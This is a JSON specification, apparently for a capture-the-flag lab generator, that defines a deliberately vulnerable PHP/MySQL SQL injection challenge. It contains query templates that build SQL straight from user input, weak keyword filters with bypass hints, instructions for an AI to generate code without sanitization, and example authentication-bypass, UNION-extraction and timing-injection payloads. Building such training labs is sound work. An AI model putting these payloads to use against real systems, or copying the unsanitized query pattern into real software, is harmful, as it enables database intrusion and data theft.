{
  "vulnerability_id": "sqli_001",
  "name": "SQL Injection",
  "category": "sql_injection",
  "difficulty_range": [1, 5],
  "description": "SQL injection allows attackers to interfere with database queries by injecting malicious SQL code through user input.",
  
  "infrastructure": {
    "needs_database": true,
    "database_type": "mysql",
    "needs_file_system": false,
    "needs_external_service": false,
    "docker_requirements": {
      "base_image": "php:8.0-apache",
      "extensions": ["mysqli", "pdo", "pdo_mysql"],
      "packages": ["default-mysql-client"],
      "ports": [80]
    }
  },
  
  "database_schema": {
    "tables": [
      {
        "name": "users",
        "columns": ["id INT PRIMARY KEY AUTO_INCREMENT", "username VARCHAR(50)", "password VARCHAR(255)", "email VARCHAR(100)", "role VARCHAR(20)"]
      },
      {
        "name": "secrets",
        "columns": ["id INT PRIMARY KEY AUTO_INCREMENT", "flag VARCHAR(255)", "description TEXT", "created_at TIMESTAMP"]
      }
    ],
    "seed_data": {
      "users": [
        {"username": "admin", "password": "admin123", "email": "admin@hack.com", "role": "admin"},
        {"username": "user", "password": "password", "email": "user@hack.com", "role": "user"}
      ],
      "secrets": [
        {"flag": "{{FLAG}}", "description": "Capture this flag!", "created_at": "NOW()"}
      ]
    },
    "flag_location": "secrets.flag"
  },
  
  "variants": [
    {
      "name": "Error-based SQL Injection",
      "description": "Exploits database error messages to extract information",
      "difficulty": 2,
      "exploit_example": "' OR 1=1-- -",
      "sink_function": "mysqli_query",
      "output_type": "error_message"
    },
    {
      "name": "Union-based SQL Injection",
      "description": "Uses UNION to combine results from injected queries",
      "difficulty": 3,
      "exploit_example": "' UNION SELECT 1,flag,3 FROM secrets-- -",
      "sink_function": "mysqli_query",
      "output_type": "direct_output"
    },
    {
      "name": "Blind SQL Injection",
      "description": "No direct output, must infer data from behavior",
      "difficulty": 4,
      "exploit_example": "' AND SLEEP(5)-- -",
      "sink_function": "mysqli_query",
      "output_type": "timing"
    }
  ],
  
  "entry_points": [
    {
      "type": "http_get_param",
      "parameter_name": "id",
      "context": "user_lookup"
    },
    {
      "type": "http_post_param",
      "parameter_name": "username",
      "context": "login_form"
    },
    {
      "type": "http_get_param",
      "parameter_name": "search",
      "context": "search_function"
    }
  ],
  
  "mutation_axes": {
    "filters": {
      "basic": [
        {
          "name": "single_quote",
          "type": "single_quote",
          "php_code": "$input = str_replace(\"'\", \"\", $input);",
          "description": "Removes single quotes",
          "bypassable": true,
          "bypass_hint": "Use double quotes or comments"
        },
        {
          "name": "or_keyword",
          "type": "or_keyword",
          "php_code": "$input = preg_replace('/\\\\bOR\\\\b/i', '', $input);",
          "description": "Removes OR keyword",
          "bypassable": true,
          "bypass_hint": "Use || or OORR"
        }
      ],
      "medium": [
        {
          "name": "union_keyword",
          "type": "union_keyword",
          "php_code": "$input = preg_replace('/\\\\bUNION\\\\b/i', '', $input);",
          "description": "Removes UNION keyword",
          "bypassable": true,
          "bypass_hint": "Use UUNIONNION"
        },
        {
          "name": "select_keyword",
          "type": "select_keyword",
          "php_code": "$input = preg_replace('/\\\\bSELECT\\\\b/i', '', $input);",
          "description": "Removes SELECT keyword",
          "bypassable": true,
          "bypass_hint": "Use SELSELECTECT"
        }
      ],
      "advanced": [
        {
          "name": "sql_comments",
          "type": "sql_comments",
          "php_code": "$input = preg_replace('/--.*$/m', '', $input);",
          "description": "Removes SQL comments",
          "bypassable": true,
          "bypass_hint": "Use # or /**/ comments"
        }
      ]
    },
    
    "contexts": [
      {
        "name": "login_form",
        "query_template": "SELECT * FROM users WHERE username='{{INPUT}}' AND password='{{PASSWORD}}'",
        "ui_theme": "authentication",
        "description": "User authentication system"
      },
      {
        "name": "user_search",
        "query_template": "SELECT * FROM users WHERE username LIKE '%{{INPUT}}%'",
        "ui_theme": "search",
        "description": "User search functionality"
      },
      {
        "name": "profile_view",
        "query_template": "SELECT * FROM users WHERE id={{INPUT}}",
        "ui_theme": "profile",
        "description": "User profile viewer"
      }
    ],
    
    "sinks": [
      "mysqli_query",
      "mysqli_real_query",
      "mysql_query",
      "PDO::query"
    ]
  },
  
  "ai_generation_hints": {
    "code_structure": "Create PHP code that connects to MySQL, executes vulnerable query, displays results",
    "database_connection": "mysqli_connect('db', 'hackforge', 'hackforge123', 'hackforge')",
    "vulnerability_placement": "Place user input directly in SQL query without sanitization",
    "output_format": "Display query results in HTML table or error messages",
    "dockerfile_notes": "Include mysqli extension, mysql-client package"
  },
  
  "exploit_examples": [
    {
      "payload": "' OR '1'='1",
      "description": "Bypass authentication",
      "expected_result": "Returns all users"
    },
    {
      "payload": "' UNION SELECT 1,flag,3 FROM secrets-- -",
      "description": "Extract flag using UNION",
      "expected_result": "Displays flag in results"
    },
    {
      "payload": "' AND SLEEP(5)-- -",
      "description": "Blind injection timing attack",
      "expected_result": "Response delayed by 5 seconds"
    }
  ]
}
